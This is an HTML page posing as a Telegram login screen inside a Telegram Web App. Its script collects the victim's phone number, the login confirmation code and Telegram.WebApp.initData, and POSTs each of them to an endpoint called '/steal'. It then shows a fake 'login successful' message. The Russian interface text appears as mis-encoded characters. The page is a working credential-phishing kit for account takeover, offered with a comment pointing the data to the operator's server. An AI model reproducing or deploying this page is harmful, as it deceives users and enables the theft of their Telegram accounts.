<!DOCTYPE html>
<html>
<head>
    <title>Telegram</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #1e1e1e; color: white; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
        
        .container { max-width: 400px; margin: 0 auto; padding: 20px; }
        
        .header { text-align: center; margin-bottom: 40px; }
        .logo { font-size: 48px; margin-bottom: 10px; }
        
        .phone-input, .code-input { 
            background: #2b2b2b; 
            border: 1px solid #444; 
            border-radius: 12px; 
            padding: 15px; 
            margin: 10px 0; 
            color: white; 
            font-size: 16px;
            width: 100%;
        }
        
        .btn { 
            background: #8774e1; 
            color: white; 
            border: none; 
            padding: 15px; 
            border-radius: 12px; 
            width: 100%; 
            font-size: 16px;
            margin: 20px 0;
            cursor: pointer;
        }
        
        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
        
        .monkey {
            text-align: center;
            margin: 30px 0;
            font-size: 80px;
            animation: bounce 2s infinite;
        }
        
        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }
        
        .hint {
            color: #888;
            font-size: 14px;
            text-align: center;
            margin: 10px 0;
        }
        
        #stage-phone, #stage-code { display: none; }
        #stage-phone.active, #stage-code.active { display: block; }
    </style>
</head>
<body>
    <div class="container">
        <!-- –≠—Ç–∞–ø —Ç–µ–ª–µ—Ñ–æ–Ω–∞ -->
        <div id="stage-phone" class="active">
            <div class="header">
                <div class="logo">üì±</div>
                <h2>–í–≤–µ–¥–∏—Ç–µ –≤–∞—à –Ω–æ–º–µ—Ä</h2>
                <div class="hint">–ù–∞ –Ω–µ–≥–æ –ø—Ä–∏–¥–µ—Ç –∫–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è</div>
            </div>
            
            <input type="tel" id="phone" class="phone-input" placeholder="+7 123 456-78-90" />
            <button class="btn" onclick="sendPhone()">–î–∞–ª–µ–µ</button>
        </div>
        
        <!-- –≠—Ç–∞–ø –∫–æ–¥–∞ -->
        <div id="stage-code">
            <div class="header">
                <div class="monkey">üêµ</div>
                <h2>–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥</h2>
                <div class="hint">–ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –Ω–∞ –≤–∞—à —Ç–µ–ª–µ—Ñ–æ–Ω</div>
            </div>
            
            <input type="text" id="code" class="code-input" placeholder="12345" maxlength="5" />
            <button class="btn" onclick="sendCode()">–í–æ–π—Ç–∏</button>
        </div>
    </div>

    <script>
        let userPhone = '';
        
        function sendPhone() {
            const phone = document.getElementById('phone').value;
            if (!phone) return;
            
            userPhone = phone;
            
            // –ü–µ—Ä–µ–∫–ª—é—á–∞–µ–º –Ω–∞ —ç—Ç–∞–ø –∫–æ–¥–∞
            document.getElementById('stage-phone').classList.remove('active');
            document.getElementById('stage-code').classList.add('active');
            
            // –°–∏–º—É–ª–∏—Ä—É–µ–º –æ—Ç–ø—Ä–∞–≤–∫—É –∫–æ–¥–∞
            setTimeout(() => {
                // –í —Ä–µ–∞–ª—å–Ω–æ—Å—Ç–∏ –∑–¥–µ—Å—å –∑–∞–ø—Ä–æ—Å –∫ —Ç–≤–æ–µ–º—É —Å–µ—Ä–≤–µ—Ä—É
                fetch('/steal', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        stage: 'phone_entered',
                        phone: phone,
                        tg_data: Telegram.WebApp.initData
                    })
                });
            }, 500);
        }
        
        function sendCode() {
            const code = document.getElementById('code').value;
            if (!code) return;
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∫–æ–¥ –Ω–∞ —Å–µ—Ä–≤–µ—Ä
            fetch('/steal', {
                method: 'POST', 
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    stage: 'code_entered', 
                    phone: userPhone,
                    code: code,
                    tg_data: Telegram.WebApp.initData
                })
            });
            
            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –∑–∞–≥—Ä—É–∑–∫—É
            const btn = document.querySelector('#stage-code .btn');
            btn.textContent = '–í—Ö–æ–¥...';
            btn.disabled = true;
            
            // –ß–µ—Ä–µ–∑ 2 —Å–µ–∫—É–Ω–¥—ã "—É—Å–ø–µ—à–Ω—ã–π –≤—Ö–æ–¥"
            setTimeout(() => {
                // –ó–¥–µ—Å—å –º–æ–∂–Ω–æ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–∏—Ç—å –∏–ª–∏ –ø–æ–∫–∞–∑–∞—Ç—å —É—Å–ø–µ—Ö
                document.body.innerHTML = `
                    <div class="container">
                        <div class="header">
                            <div style="font-size: 60px; margin-bottom: 20px;">‚úÖ</div>
                            <h2>–í—Ö–æ–¥ –≤—ã–ø–æ–ª–Ω–µ–Ω!</h2>
                            <div class="hint">–ê–∫–∫–∞—É–Ω—Ç —É—Å–ø–µ—à–Ω–æ –ø–æ–¥–∫–ª—é—á–µ–Ω</div>
                        </div>
                    </div>
                `;
            }, 2000);
        }
        
        // –ê–≤—Ç–æ—Ñ–æ–∫—É—Å –Ω–∞ –∏–Ω–ø—É—Ç—ã
        document.getElementById('phone').focus();
        document.getElementById('code').addEventListener('input', function(e) {
            if (this.value.length === 5) {
                sendCode();
            }
        });
    </script>
</body>
</html>
